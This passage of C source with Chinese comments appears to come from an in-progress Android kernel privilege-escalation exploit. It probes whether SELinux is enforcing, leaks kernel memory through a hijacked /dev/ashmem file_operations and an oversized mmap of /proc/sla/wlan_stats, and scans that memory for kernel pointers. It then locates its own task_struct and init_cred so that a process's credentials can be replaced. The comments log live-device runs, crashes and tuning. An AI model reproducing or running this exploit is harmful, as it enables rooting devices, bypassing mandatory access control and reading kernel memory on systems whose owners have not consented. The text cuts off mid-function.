 *   **0644 root:readtracefs(组只读)** ⇒ uid 2000 永远写不动它, **和 SELinux 无关** ⇒ 拿它当
 *   "MAC 关卡"是错的(上一轮 `[GATE] open(kprobe_events) errno=13` 真凶是 DAC)。
 *   真正"只有 SELinux 会拦"的关卡必须同时满足 DAC 放行:
 *     `tracing_on` / `buffer_size_kb` / `trace` / `saved_cmdlines_size` = **0666** ✔
 *     自己拥有文件打 `security.*` xattr ✔
 *   (`/proc/kcore` 本机根本不存在; `/dev/kmsg` = 0660 root:system 组不含我们 ⇒ 也是 DAC 挡)
 * ★★ 2026-09-28 一手校正(`cm57/macgate.c` 在 **enforcing** 状态下的基线):
 *      `tracing_on` / `buffer_size_kb` / `trace` 在 enforcing 下 shell 就能 open+write!
 *      (它们是 0666 且 shell 在 gid 3012=readtracefs, 而本机策略**允许** shell 写这几格)
 *      ⇒ 把它们当"只有 MAC 会拦"的关卡是**错的** —— 旧日志里"打之前就开了 2 格"就是这么来的,
 *        于是"★★★ MAC 真的失效了 ★★★"那句判据一直掺假。
 *      enforcing 下真正被拦的(= 可当关卡): `/proc/sla/wlan_stats`(连 stat 都 EACCES)、
 *      `/dev/ashmem`(open EACCES)、`/proc/1/environ`(0400 root ⇒ DAC 挡, 不能用)、
 *      `kprobe_events`(0644 root:readtracefs ⇒ DAC 挡, 不能用)、`core_pattern`(DAC 挡)、
 *      `setxattr(security.*)`(EPERM, 而且 permissive 之后仍 EPERM ⇒ 也不能当关卡)。
 *      ⇒ 关卡只留前两格; 后面两格改成纯信息(不计入 ok)。
 * 返回值 = 通过的关卡数。 */
static const char *MAC_PATHS[4] = { "/proc/sla/wlan_stats", "/dev/ashmem",
                                    "/sys/kernel/tracing/tracing_on",
                                    "/sys/kernel/tracing/buffer_size_kb" };
static const int MAC_FLAGS[4] = { O_RDONLY, O_WRONLY, O_RDWR, O_WRONLY };
static int mac_probe(const char *tag) {
  int ok = 0;
  for (int i = 0; i < 4; i++) {
    struct stat st;
    int have = (stat(MAC_PATHS[i], &st) == 0);
    errno = 0;
    int fd = open(MAC_PATHS[i], MAC_FLAGS[i] | O_CLOEXEC);
    int e = errno;
    ssize_t w = -1;   /* 一律**不写**: 后两格只是信息, 而前两条(sla/ashmem)是只读节点 */
    if (fd >= 0 && w < 0) e = errno;
    say("[MAC:%s] %-34s stat=%s mode=%04o uid=%d gid=%d | open=%d errno=%d(%s)%s\n", tag,
        MAC_PATHS[i], have ? "ok" : "FAIL", have ? (unsigned)(st.st_mode & 07777) : 0,
        have ? (int)st.st_uid : -1, have ? (int)st.st_gid : -1, fd, e,
        fd < 0 ? strerror(e) : "OPEN-OK", i < 2 ? "" : "  (信息格, 不计入关卡)");
    if (fd >= 0) close(fd);
    if (fd >= 0 && i < 2) ok++;
  }
  {   /* 第五格: 给**自己拥有**的文件打一个 security.* xattr —— DAC 完全够, 只有 MAC 会拦 */
    const char *f = "/data/local/tmp/ghost_mac";
    int fd = open(f, O_CREAT | O_WRONLY | O_CLOEXEC, 0600);
    if (fd >= 0) close(fd);
    errno = 0;
    int r = setxattr(f, "security.ghost_test", "x", 1, 0);
    say("[MAC:%s] setxattr(%s,security.ghost_test) = %d errno=%d(%s)\n", tag, f, r,
        r < 0 ? errno : 0, r < 0 ? strerror(errno) : "OK");
    unlink(f);
    if (r == 0) ok++;
  }
  return ok;
}

/* 把 ashmem 的 read 泄露到的 .data 内容整理进日志: 整段前 0x100 字节的 hex + 所有
 * "像内核指针"的 8 字节槽(标出它在窗口里的偏移), 供离线用 kallsyms 反查是谁的指针。 */
static void ashmem_leak_dump(int fd) {
  static unsigned char lb[0x20000];
  ssize_t n = read(fd, lb, sizeof lb);
  int e = errno;
  say("[AS] read(/dev/ashmem) = %zd errno=%d(%s)  ← 真 ashmem 没有 .read ⇒ -EINVAL=劫持没落\n",
      n, e, strerror(e));
  if (n <= 0x20) return;
  uintptr_t got = 0;
  memcpy(&got, lb + ASH_FOPS_OFF, 8);
  say("[AS] 泄露窗第 0x10 格 = %016lx  期望 %016lx ⇒ %s\n", (unsigned long)got,
      (unsigned long)LEAK_FOPS_ADDR,
      got == LEAK_FOPS_ADDR ? "★★★ 指针写落地 + slide 对 + 带内地址算得准(三重自校验)★★★"
                            : "(不符 ⇒ 这一发没落, 或 miscdevice 布局与镜像不符)");
  char hb[3 * 96 + 1];
  hexbuf(hb, sizeof hb, lb, n > 96 ? 96 : n);
  say("[AS] 窗口头 96 字节原样: %s\n", hb);
  int cnt = 0;
  say("[AS] 窗口里像内核指针的槽(只列高位全 1 的, 前 200 个):\n");
  for (ssize_t o = 0; o + 8 <= n && cnt < 200; o += 8) {
    uintptr_t v;
    memcpy(&v, lb + o, 8);
    if ((v >> 40) == 0xffffffULL && v < 0xffffffd000000000ULL && (v & 7) == 0) {
      say("[AS]   +0x%05x = %016lx%s\n", (unsigned)o, (unsigned long)v,
          (o == ASH_FOPS_OFF) ? "   <- misc.fops(我们写的)" : "");
      cnt++;
    }
  }
  say("[AS] 共列 %d 个; 窗口 = [%016lx, +0x63ed0) ⇒ 反查这些指针指向哪, 就是下一步的靶子\n",
      cnt, (unsigned long)(LK_ASHMEM_MISC + SLIDE));
}

/* ===== permissive 之后的**零风险**泄露: /proc/sla/{wlan,wwan}_stats =====
 * 一手来源 `analysis/FAKE-SEQFILE-READ-GADGET-20260928.md`(子代理反汇编 + 我复核):
 *   `stats_fops @ 0xffffffc0121d8b10`(.data 可写) 的 `.read = stats_read`, 而
 *   `stats_read` = `simple_read_from_buffer(to, count, ppos, from = file->private_data,
 *   avail = 0x63ed0 = 409296)` ⇒ **private_data 是驱动 kmalloc 的一块堆缓冲** ⇒
 *   `cat` 这个 0644 节点 = **一次 409KB 的堆原文转储**, 而且带 `default_llseek` ⇒ 偏移可选。
 * ⇒ 这条完全不占 punch 名额、不写任何东西 ⇒ 只要 MAC 放开(已能稳定做到)就是纯观测。
 * ⇒ 拦路的一直是 SELinux(`ls /proc/sla` = EACCES), 不是 DAC(文件本身 0644)。 */
static void sla_dump(void) {
  static const char *f[2] = { "/proc/sla/wlan_stats", "/proc/sla/wwan_stats" };
  static unsigned char b[0x70000];
  for (int i = 0; i < 2; i++) {
    int fd = open(f[i], O_RDONLY | O_CLOEXEC);
    if (fd < 0) { say("[SLA] open(%s) errno=%d(%s)\n", f[i], errno, strerror(errno)); continue; }
    ssize_t tot = 0;
    while (tot < (ssize_t)sizeof b) {
      ssize_t n = read(fd, b + tot, sizeof b - tot);
      if (n <= 0) break;
      tot += n;
    }
    close(fd);
    say("[SLA] %s 读到 %zd 字节\n", f[i], tot);
    int cnt = 0;
    for (ssize_t o = 0; o + 8 <= tot; o += 8) {
      uint64_t v;
      memcpy(&v, b + o, 8);
      if ((v >> 40) >= 0xffffff80ULL && (v & 7) == 0 && v < 0xffffffc0ffffffffULL) {
        if (cnt < 40) say("[SLA]   +0x%05x = %016lx\n", (unsigned)o, (unsigned long)v);
        cnt++;
      }
    }
    say("[SLA] 里面像内核指针的槽 = %d 个(前 40 个已列出)\n", cnt);
  }
}


/* mmap 过度读取的试验: stats_map 用 remap_pfn_range(__pa(private_data)>>12, len=vm_end-vm_start),
 * 长度不受对象大小限制 ⇒ 映射 2MB 就可能看到这块缓冲**物理相邻**的线性映射内存(里面有
 * task_struct/cred)。风险: 厂商写死的 pgprot 可能带 PXN/UXN ⇒ EL0 读会 SIGSEGV ⇒ 单独进程里试。 */
static void sla_mmap_test(void) {
  const char *f = "/proc/sla/wlan_stats";
  int fd = open(f, O_RDONLY | O_CLOEXEC);
  if (fd < 0) { say("[MMAP] open(%s) errno=%d\n", f, errno); return; }
  size_t L = 2u * 1024u * 1024u;
  void *p = mmap(NULL, L, PROT_READ, MAP_SHARED, fd, 0);
  if (p == MAP_FAILED) { say("[MMAP] mmap(2MB,SHARED,rdonly,%s) 失败 errno=%d(%s)\n", f, errno, strerror(errno));
    p = mmap(NULL, 0x80000, PROT_READ, MAP_SHARED, fd, 0);
    if (p == MAP_FAILED) { say("[MMAP] 512KB 也失败 errno=%d\n", errno); close(fd); return; }
    L = 0x80000; }
  say("[MMAP] mmap ok = %p len=%zu ⇒ 试探读取\n", p, L);
  volatile char *c = (volatile char *)p;
  char first = c[0];
  say("[MMAP]   第一字节 = %02x\n", (unsigned)(unsigned char)first);
  int cnt = 0; long nonzero = 0;
  for (size_t o = 0; o + 8 <= L; o += 8) {
    uint64_t v; memcpy(&v, (char *)p + o, 8);
    if (v) nonzero++;
    if (v > 0xffffff8000000000ULL && v < 0xffffffc0ffffffffULL && (v & 7) == 0) {
      if (cnt < 40) say("[MMAP]   +0x%07zx = %016lx\n", o, (unsigned long)v);
      cnt++;
    }
  }
  say("[MMAP] 非 0 的 8 字节槽 = %ld, 像内核指针的 = %d\n", nonzero, cnt);
  munmap(p, L); close(fd);
}

/* ===== 标记-差分实验(2026-09-28): 在**同一块静态 .data 窗口**上做"动作前/动作后"两次全扫 =====
 * 为什么可行: 每次 `open()` 都会拿到一个**全新的 struct file(f_pos=0)** ⇒ 同一次劫持可以反复
 * 从窗口起点重读(不需要 lseek — 伪 fops 的 .llseek 槽被配对写踩成了垃圾指针, 调它必炸)。
 * 判据: 只有"会随我们的动作变化的槽"才可能指向我们自己的对象(file/inode/dentry/task/cred)。
 * ★ 一定要先做一次**空白对照**(什么都不做就再扫一遍): .data 里满是活跃驱动的状态,
 *   没有对照就分不清"我们造成的变化"和"系统自己的抖动"。 */
#define SNAPBYTES 0x40000
static unsigned char SNAP[8][SNAPBYTES];
static ssize_t SNAPN[8];
static void snap_read(int idx) {
  int fd = open("/dev/ashmem", O_RDWR | O_CLOEXEC);
  SNAPN[idx] = -1;
  if (fd < 0) { say("[MARK] snap%d open 失败 errno=%d\n", idx, errno); return; }
  ssize_t tot = 0;
  while (tot < SNAPBYTES) {
    ssize_t n = read(fd, SNAP[idx] + tot, (size_t)(SNAPBYTES - tot));
    if (n <= 0) break;
    tot += n;
  }
  SNAPN[idx] = tot;
  close(fd);
  say("[MARK] snap%d = %zd 字节\n", idx, tot);
}
static int snap_diff(int a, int b, const char *tag) {
  ssize_t m = SNAPN[a] < SNAPN[b] ? SNAPN[a] : SNAPN[b];
  int cnt = 0;
  if (m <= 0) return -1;
  say("[MARK:%s] 比较 snap%d/snap%d 前 %zd 字节:\n", tag, a, b, m);
  for (ssize_t o = 0; o + 8 <= m; o += 8) {
    uint64_t x, y;
    memcpy(&x, SNAP[a] + o, 8); memcpy(&y, SNAP[b] + o, 8);
    if (x != y) {
      cnt++;
      if (cnt <= 40)
        say("[MARK:%s]   +0x%05x: %016lx -> %016lx%s\n", tag, (unsigned)o,
            (unsigned long)x, (unsigned long)y,
            ((y >> 32) == 0xffffffc0ULL || (y >> 40) == 0xffffffULL) ? "   <= 像核指针" : "");
    }
  }
  say("[MARK:%s] 共 %d 格变化\n", tag, cnt);
  return cnt;
}
static void marker_experiment(void) {
  int jnk[8];
  for (int i = 0; i < 8; i++) jnk[i] = -1;
  snap_read(0);
  usleep(400000);
  snap_read(1);
  snap_diff(0, 1, "空白对照");                 /* ⇒ 这是噪声底, 后面比它显著才算数 */
  for (int i = 0; i < 6; i++) kid_new();        /* 标记1: 造 6 个孩子(task_struct+pid+fd 分配) */
  usleep(200000);
  snap_read(2);
  snap_diff(1, 2, "fork6");
  for (int i = 0; i < 8; i++) {                 /* 标记2: open 8 个文件(file+dentry+inode) */
    int f = open("/dev/null", O_RDWR | O_CLOEXEC);
    if (f >= 0) jnk[i] = f;
  }
  usleep(200000);
  snap_read(3);
  snap_diff(2, 3, "open8");
  for (int i = 0; i < 8; i++) if (jnk[i] >= 0) close(jnk[i]);
  for (int i = 0; i < 8; i++) {                 /* 标记3: 写 8 个小文件(触发 inode/write 路径) */
    char p[64]; snprintf(p, sizeof p, "/data/local/tmp/ghost_m%d", i);
    int f = open(p, O_CREAT | O_WRONLY | O_TRUNC | O_CLOEXEC, 0600);
    if (f >= 0) { ssize_t w = write(f, "x", 1); (void)w; close(f); }
    unlink(p);
  }
  usleep(200000);
  snap_read(4);
  snap_diff(3, 4, "write8");
  say("[MARK] 上面任何一格若在某个标记后变化、而在空白对照里不变, 就是「我们自己的对象」的地址\n");
}


/* ---- 过界读的三件基础件: SIGBUS 兜底 / 取 qword / 求窗口基址 K ----
 * K 的求法(tsfind.c 真机坐实, 自洽 48 万格): 对每个"像核指针"的槽取 (值 - 自身偏移),
 * **按页对齐分桶**再取众数。不分桶会被"每 64 字节一个 hlist_head、first 指向自己+8"这类
 * 表带偏成 K+8(sen14 就拿着 K+8 去换算, 全程算错)。 */
static sigjmp_buf sbb_jb;
static volatile int sbb_on;
static void sbb_handler(int sig) { (void)sig; if (sbb_on) siglongjmp(sbb_jb, 1); }
static uint64_t win64(unsigned char *b, size_t o) { uint64_t v; memcpy(&v, b + o, 8); return v; }
static int cmp64asc(const void *a, const void *b) {
  uint64_t x = *(const uint64_t *)a, y = *(const uint64_t *)b;
  return x < y ? -1 : (x > y ? 1 : 0);
}
static uint64_t win_anchor(unsigned char *m, const unsigned char *ok, size_t np, size_t *cnt_out) {
  size_t cap = 2u << 20, n = 0;
  uint64_t *kv = malloc(cap * sizeof *kv);
  if (!kv) return 0;
  for (size_t i = 0; i < np; i++) {
    if (!ok[i]) continue;
    for (size_t o = i * 4096u; o + 8 <= (i + 1) * 4096u; o += 8) {
      uint64_t v = win64(m, o);
      if ((v >> 48) != 0xffffULL || v <= o) continue;
      if (n < cap) kv[n++] = (v - o) & ~0xfffULL;
    }
  }
  qsort(kv, n, sizeof *kv, cmp64asc);
  uint64_t best = 0; size_t bestn = 0, run = 1;
  for (size_t i = 1; i <= n; i++) {
    if (i < n && kv[i] == kv[i - 1]) run++;
    else { if (run > bestn) { bestn = run; best = kv[i - 1]; } run = 1; }
  }
  free(kv);
  if (cnt_out) *cnt_out = bestn;
  return bestn >= 1000 ? best : 0;
}

/* ===== 2026-09-28: 从 /proc/sla 的过界读里**认出自己的 task_struct**(零 punch, 只读) =====
 * 一手依据(cm57/tsfind.c 真机输出, 见 analysis/GHOST-CRED-SWEEP-20260928.md §7):
 *   `stats_map@0x10f73258` = `remap_pfn_range(vma, vm_start, __pa(private_data)>>12, len, prot)`
 *   —— **整个函数不看 vm_pgoff** ⇒ mmap 的 offset 参数完全不生效(真机 mtest: 0..64G 偏移首格全同),
 *   但长度任给 ⇒ 拿到的是"从 __pa(private_data) 起、最长 1 GB 的连续物理页只读窗口"
 *   (实测可读 519 MB)。窗口内 物理偏移 o ↔ 线性映射 VA = K + o, K 由"值-偏移"按页对齐取众数得到。
 *   在这个窗口里有一张 **每任务一条** 的 SLA 表: 记录 = { task_struct *(+0), u32 ×5(+8..+39),
 *   comm[16](+40) }, 步长 72; 窗口里按 `prio(+0xb4)==static_prio(+0xb8)` +
 *   `real_cred(+0x840)==cred(+0x848)` + `stack(+0x68)` 页对齐 独立找到的 266 个 task 对象里,
 *   有 12 个的地址**正好等于某条记录的 ptr**, 而且该对象体内的 comm 与记录里的 comm 一致
 *   ⇒ ptr 就是 task_struct(偏移表一并证实)。
 * ⇒ 于是"给 comm 拿 task"是一条**白送**的动态地址通道: W 启动时把自己 comm 设成每轮唯一的
 *   `w_mark`, 这里就照它精确匹配 ⇒ 返回那条记录的 ptr。
 * 判据: 命中数必须**恰好 1**(标记唯一); 否则一律不往下打(绝不盲写)。 */
/* ===== 窗口的所有重活都放进**一次性子进程**里做(2026-09-28 的教训) =====
 * sen18 一手: 主进程自己 mmap 1 GB 并逐页探测(⇒ 519 MB 常驻)之后, 相3 第一发的判据还没打完,
 * 整个进程就被 **SIGKILL**(rc=137, 安卓 low-memory killer)收走了 —— 设备活着、permissive 还在,
 * 是我们的进程被杀。所以: **常驻的主进程绝不碰大映射**; 扫描/读回都 fork 一个子进程做完就退,
 * 结果通过一页 MAP_SHARED 的匿名内存回传。子进程被 LMK 杀掉也只是这一次没结果(可重试), 不丢命。 */
struct sla_result {
  uint64_t k;            /* 窗口基址 K(线性 VA = K + 物理偏移) */
  uint64_t task;         /* 我们(W)的 task_struct; 0 = 没找到 */
  uint64_t n_hit;        /* comm 命中的记录条数 */
  uint64_t agree;        /* 1 = 所有命中给的 task 完全一致 */
  uint64_t task2, n_hit2, agree2;   /* 第二个 comm 标记(main 自己)对应的 task */
  uint64_t z1, z2;       /* 两个"整页为 0"的干净页的诊断靶子(低偏移, 读回便宜) */
  uint64_t icred, icn, ictop, ic2, ic2n;  /* 实测 init_cred / 它的票数 / 候选 task 总数 / 第二名 / 票数 */
  uint64_t ic_uid, ic_euid;   /* 若这个 cred 正好落在窗口里, 读回的 uid/euid(0xFFFFFFFF = 读不到) */
  uint64_t peek[4];      /* 子进程读回的 qword */
  uint64_t err;          /* 1=open/mmap 失败, 2=没求出 K */
};
static volatile struct sla_result *sla_sh;
static int sla_shm_init(void) {
  if (sla_sh) return 0;
  void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  if (p == MAP_FAILED) return -1;
  sla_sh = (volatile struct sla_result *)p;
  return 0;
}
static pid_t sla_spawn_child;
/* 子进程体: 打开节点 → 映射窗口(只碰需要的页) → 把结果写进 sla_sh → _exit */
static void sla_child_scan(const char *mark, const char *mark2, size_t want_mb, int aux) {
  memset((void *)sla_sh, 0, sizeof *sla_sh);
  sla_sh->ic_uid = ~0ULL; sla_sh->ic_euid = ~0ULL;
  int fd = open("/proc/sla/wlan_stats", O_RDONLY | O_CLOEXEC);
  if (fd < 0) { sla_sh->err = 1; _exit(0); }
  size_t L = 0;
  unsigned char *m = MAP_FAILED;
  size_t try = (want_mb ? want_mb : 1024u) << 20;
  for (size_t s = try; s >= (16u << 20); s >>= 1) {
    m = mmap(NULL, s, PROT_READ, MAP_SHARED, fd, 0);
    if (m != MAP_FAILED) { L = s; break; }
  }
  if (m == MAP_FAILED) { sla_sh->err = 1; close(fd); _exit(0); }
  struct sigaction sa;
  memset(&sa, 0, sizeof sa); sa.sa_handler = sbb_handler; sigemptyset(&sa.sa_mask);
  sigaction(SIGBUS, &sa, NULL);
  size_t np = L / 4096u, okp = 0;
  unsigned char *ok = (unsigned char *)mmap(NULL, ((np + 4095) & ~(size_t)4095) + 4096,
                                            PROT_READ | PROT_WRITE,
                                            MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  if (ok == MAP_FAILED) { munmap(m, L); close(fd); _exit(0); }
  for (size_t i = 0; i < np; i++) {
    sbb_on = 1;
    if (sigsetjmp(sbb_jb, 1) == 0) { volatile char c = m[i * 4096u]; (void)c; ok[i] = 1; okp++; }
    sbb_on = 0;
  }
  size_t bn = 0;
  uint64_t K = 0;
  /* ★ 2026-09-28 sen24 的时间教训: 认 task 只需要"扫 comm 记录", 完全不需要 K; 而 win_anchor
   *   要把 519MB 里每个 8 字节都读一遍(≈65M 次)+ 排序, 加上 (B) 段的众数对照, 让子进程从
   *   几秒变成几十秒 —— 我们整个进程因此在 140s 被低内存杀手收走(rc=137), 正好死在
   *   相3 落地之后、相4 补刀之前(那一发的预言还精确命中: 预测 uid=-94, 实测 -94)。
   *   ⇒ 只有 DIAG(需要零页靶子 + 读回)才付这份钱。 */
  if (aux) {
    K = win_anchor(m, ok, np, &bn);
    if (!K) { sla_sh->err = 2; munmap(m, L); close(fd); _exit(0); }
    sla_sh->k = K;
  }
  size_t ml = strlen(mark);
  size_t ml2 = (mark2 && mark2[0]) ? strlen(mark2) : 0;
  uintptr_t first = 0; int seen = 0; int ag = 1;
  uintptr_t first2 = 0; int seen2 = 0; int ag2 = 1;
  /* 一趟扫描同时收两个标记: 主标记(W, ghost 的持有者)与靶子标记(V/main)。
   * 为什么靶子不能是 W: 孪生弹差分证明"配对写盖住 init_cred"本身不炸, 炸的是**把正在被
   * 这条链走改动的 task 的 cred 换掉**(5/6 次当场重启)。⇒ 换一个链走绝不碰的任务。 */
  for (size_t i = 0; i < np; i++) {
    if (!ok[i]) continue;
    for (size_t o = i * 4096u; o + SLA_REC_COMM + 16 <= L; o += 8) {
      if (o / 4096u != i && !ok[o / 4096u]) break;
      if (!ok[(o + SLA_REC_COMM + 15) / 4096u]) break;
      uint64_t v = win64(m, o);
      if ((v >> 48) != 0xffffULL || (v & 7)) continue;
      const char *c = (const char *)(m + o + SLA_REC_COMM);
      if (ml && !c[ml] && !memcmp(c, mark, ml)) {
        if (!seen) first = (uintptr_t)v;
        else if ((uintptr_t)v != first) ag = 0;
        seen++; sla_sh->n_hit = (uint64_t)seen;
      } else if (ml2 && !c[ml2] && !memcmp(c, mark2, ml2)) {
        if (!seen2) first2 = (uintptr_t)v;
        else if ((uintptr_t)v != first2) ag2 = 0;
        seen2++; sla_sh->n_hit2 = (uint64_t)seen2;
      }
      /* ★ 早退条件(两版教训叠出来的):
       *   · v5: 第二趟限死"主标记命中区 ±64MB" ⇒ 靶子那条记录在更低偏移上就永远漏掉;
       *   · v6: 于是把两个标记合成一趟, 但早退条件里还带着"主标记满 8 条" ⇒ 扫描被拖到整窗,
       *         收来的 8 条里混进**过期副本**(v6 实测 一致=0) ⇒ 反而认不出。
       *   ⇒ 规则: **要哪个标记就以哪个为准提早退**。VICTIM 模式下靶子(V)拿到 2 份就走,
       *     主标记(W)只是顺带(它那份记录在提权路径里已经不用了)。 */
      if (ml2 ? (seen2 >= 2) : (seen >= 8)) break;
    }
    if (ml2 ? (seen2 >= 2) : (seen >= 8)) break;
  }
    sla_sh->agree = (seen && ag) ? 1 : 0;
    sla_sh->agree2 = (seen2 && ag2) ? 1 : 0;
  if (seen) sla_sh->task = (uint64_t)first;
  if (seen2) sla_sh->task2 = (uint64_t)first2;
  if (!aux) { munmap(m, L); close(fd); _exit(0); }
  /* ===== (B) 经验量出 init_cred: 窗口里所有"像 task_struct"的对象, cred 槽取众数 =====
   * 判据(全用**活体实测过**的偏移): prio(+0xb4) 与 static_prio(+0xb8) 都在 [1,139] 且 prio<=sp;
   *   real_cred(+0x840)、cred(+0x848) 都是内核指针形状且 8 对齐。
   * 为什么众数 = init_cred: 这具内核有几百条内核线程, 它们**全部共享同一个 cred**(=init_cred,
   *   uid0 + 全 caps), 而用户态进程一条一个 cred ⇒ 只要票数压倒性地集中, 那个值就是它。
   * 假阳性(随机数据碰巧过了筛)只会给出票数=1 的散值, 打不过众数。 */
  {
    typedef struct { uint64_t v; uint32_t n; } cv_t;
    static cv_t cv[96];
    int ncv = 0;
    uint64_t ntop = 0;
    /* ★ 只扫**前 64 MB**就停(2026-09-28 sen20/21 的代价换来的): 这一段纯粹是"对照打印"用的
     *   (真值是 kallsyms+slide 算出来的), 但全量扫 519MB 会把主进程卡在 find_self_task 里几十秒
     *   —— 幽灵的覆盖带是**浅带**, 每多停一秒就多一分"被下一次异常/系统调用重画"的概率,
     *   sen20/21 恰好都死在 相3 第一发(而 sen19 那一把扫得更快, 活了)。 */
    size_t iend = np;
    if (iend > (64u << 20) / 4096u) iend = (64u << 20) / 4096u;
    for (size_t i = 0; i + 1 < iend; i++) {
      if (!ok[i] || !ok[i + 1]) continue;
      size_t o0 = i * 4096u;
      for (size_t o = o0; o < o0 + 4096u; o += 8) {
        uint64_t pw = win64(m, o + 0xb4);          /* 低 32 = prio, 高 32 = static_prio */
        uint32_t p = (uint32_t)pw, sp = (uint32_t)(pw >> 32);
        if (p < 1u || sp < 1u || p > 139u || sp > 139u || p > sp) continue;
        uint64_t cr = win64(m, o + OFF_T_CRED);
        uint64_t rc = win64(m, o + OFF_T_REALCRED);
        if ((cr >> 48) != 0xffffULL || (cr & 7)) continue;
        if ((rc >> 48) != 0xffffULL || (rc & 7)) continue;
        ntop++;
        int k = -1;
        for (int c = 0; c < ncv; c++) if (cv[c].v == cr) { k = c; break; }
        if (k >= 0) cv[k].n++;
        else if (ncv < 96) { cv[ncv].v = cr; cv[ncv].n = 1; ncv++; }
      }
    }
    int b1 = -1, b2 = -1;
    for (int c = 0; c < ncv; c++) {
      if (b1 < 0 || cv[c].n > cv[b1].n) b1 = c;
    }
    for (int c = 0; c < ncv; c++) {
      if (c == b1) continue;
      if (b2 < 0 || cv[c].n > cv[b2].n) b2 = c;
    }
    sla_sh->ictop = ntop;
    if (b1 >= 0) {
      sla_sh->icred = cv[b1].v;
      sla_sh->icn = cv[b1].n;
      if (b2 >= 0) { sla_sh->ic2 = cv[b2].v; sla_sh->ic2n = cv[b2].n; }
      /* 若这个 cred 恰好也落在窗口里 ⇒ 顺手读回它的 uid/euid 做旁证(读不到就留 0xFFFF...) */
      if (cv[b1].v >= (uint64_t)K && cv[b1].v + 0x20 < (uint64_t)K + L) {
        size_t co = (size_t)(cv[b1].v - K);
        if (ok[co / 4096u] && ok[(co + 0x1f) / 4096u]) {
          sla_sh->ic_uid = (uint32_t)win64(m, co + 4);
          sla_sh->ic_euid = (uint32_t)(win64(m, co + 0x14) & 0xffffffffu);
          sla_sh->peek[3] = win64(m, co);          /* usage + uid 两个 u32 */
        }
      }
    }
  }

  /* 诊断靶子: 两页整页为 0 的干净页(页#>=64, 两页相隔 >=4096 页 ⇒ 读回便宜) */
  size_t zp[2] = { 0, 0 }; int nz = 0;
  for (size_t i = 64; i < np && nz < 2; i++) {
    if (!ok[i]) continue;
    size_t j;
    for (j = 0; j < 512; j++) if (win64(m, i * 4096u + 8 * j) != 0) break;
    if (j != 512) continue;
    if (nz == 1 && i - zp[0] < 4096) continue;
    zp[nz++] = i;
  }
  if (nz == 2) {
    sla_sh->z1 = (uint64_t)(K + zp[0] * 4096u);
    sla_sh->z2 = (uint64_t)(K + zp[1] * 4096u);
  }
  if (seen) sla_sh->task = (uint64_t)first;
  munmap(m, L);
  close(fd);
  _exit(0);
}
/* 主入口: 让子进程去扫, 主进程只等结果(自己不碰大映射) */
static int sla_cached = 0;   /* 一轮最多扫一次: 扫完 519MB 又慢又给低内存杀手加压(sen18/19 的教训) */
static int sla_tries = 0;    /* 真扫了几次(失败也计数 ⇒ 不会拿"再扫一遍"当免费重试) */
static uintptr_t find_self_task(const char *mark, const char *mark2) {
  if (!mark || !mark[0]) { say("[SLA] 还没有 comm 标记 ⇒ 不找\n"); return 0; }
  if (sla_cached) {
    say("[SLA] 用本轮缓存: task=%016lx init_cred(实测)=%016lx ⇒ 不再扫窗口\n",
        (unsigned long)TASK, (unsigned long)ICRED);
  return USEMAIN ? MTASK : TASK;
  }
  /* 一次全量扫 = 子进程常驻 ~519MB, 安卓低内存杀手会盯上我们(sen18/19 各被收走一次)
   * ⇒ 每轮最多真扫 2 次, 没结果就认栽, 不拿"多扫几遍"当重试。 */
  if (sla_tries >= 2) {
    say("[SLA] × 已经真扫过 %d 次还没认出 task ⇒ 不再扫(避免被低内存杀手收走)\n", sla_tries);
    return 0;
  }
  sla_tries++;
  if (sla_shm_init()) { say("[SLA] 共享结果页分配失败\n"); return 0; }
  memset((void *)sla_sh, 0, sizeof *sla_sh);
  sla_spawn_child = 1;
  pid_t c = fork();
  if (c == 0) { sla_child_scan(mark, mark2, 1024, DIAG); _exit(0); }
  sla_spawn_child = 0;
  if (c < 0) { say("[SLA] fork 失败 errno=%d(%s)\n", errno, strerror(errno)); return 0; }
  int st = 0;
  waitpid(c, &st, 0);
  say("[SLA] 子进程扫完: err=%llu 命中=%llu task=%016llx 一致=%llu K=%016llx Z1=%016lx Z2=%016lx (wait=%d)\n",
      (unsigned long long)sla_sh->err, (unsigned long long)sla_sh->n_hit,
      (unsigned long long)sla_sh->task, (unsigned long long)sla_sh->agree,
      (unsigned long long)sla_sh->k, (unsigned long)sla_sh->z1, (unsigned long)sla_sh->z2, st);
  if (DIAG) {   /* 非 DIAG 时子进程根本没算 K/众数(sla_child_scan 里提前退出了) ⇒ 不打印 */
  say("[SLA] (B) 窗口内候选 task 形状 = %llu 个对象; cred 众数 = %016llx 得 %llu 票"
      "(第二名 %016llx 得 %llu 票)%s\n",
      (unsigned long long)sla_sh->ictop, (unsigned long long)sla_sh->icred,
      (unsigned long long)sla_sh->icn, (unsigned long long)sla_sh->ic2,
      (unsigned long long)sla_sh->ic2n,
      (sla_sh->ic_uid != (uint64_t)-1 || sla_sh->ic_euid != (uint64_t)-1)
        ? "" : "  [众数 cred 不在窗口内 ⇒ 读不回 uid 旁证]");
  if (sla_sh->ic_uid != (uint64_t)-1 || sla_sh->ic_euid != (uint64_t)-1)
    say("[SLA] (B) 众数 cred 在窗口里读回: 头两字=%016llx uid=%u euid=%u (用法: usage 低 32 / uid 高 32)\n",
        (unsigned long long)sla_sh->peek[3], (unsigned)sla_sh->ic_uid, (unsigned)sla_sh->ic_euid);
  {
    uintptr_t calc = (uintptr_t)(LK_INIT_CRED + SLIDE);
    say("[SLA] (B) 对照: 链接期算法给的 init_cred = %016lx, 实测众数 = %016lx ⇒ 差 %lld (0x%llx)\n",
        (unsigned long)calc, (unsigned long)sla_sh->icred,
        (long long)(sla_sh->icred - calc),
        (unsigned long long)(sla_sh->icred > calc ? sla_sh->icred - calc : calc - sla_sh->icred));
  }
  }

  if (st != 0) say("[SLA] 注: 子进程没干净退出(wait=%d) ⇒ 很可能被低内存杀手收走 ⇒ 结论不可用\n", st);
  if (sla_sh->err) { say("[SLA] × open/mmap/anchor 失败 ⇒ 一发不盲打\n"); return 0; }
  /* USEMAIN/VICTIM 模式下"必需的 task"是靶子那一份(MTASK), 主标记那份只是顺带 */
  if (!USEMAIN && !sla_sh->task) { say("[SLA] × 没认出 task ⇒ 一发不盲打\n"); return 0; }
  if (!USEMAIN && !sla_sh->agree) { say("[SLA] × 命中的记录给的 task 不一致 ⇒ 分不清 ⇒ 不写\n"); return 0; }
  MTASK = (uintptr_t)sla_sh->task2;
  say("[SLA] main task = %016llx (hits %llu agree %llu) USEMAIN=%d\n",
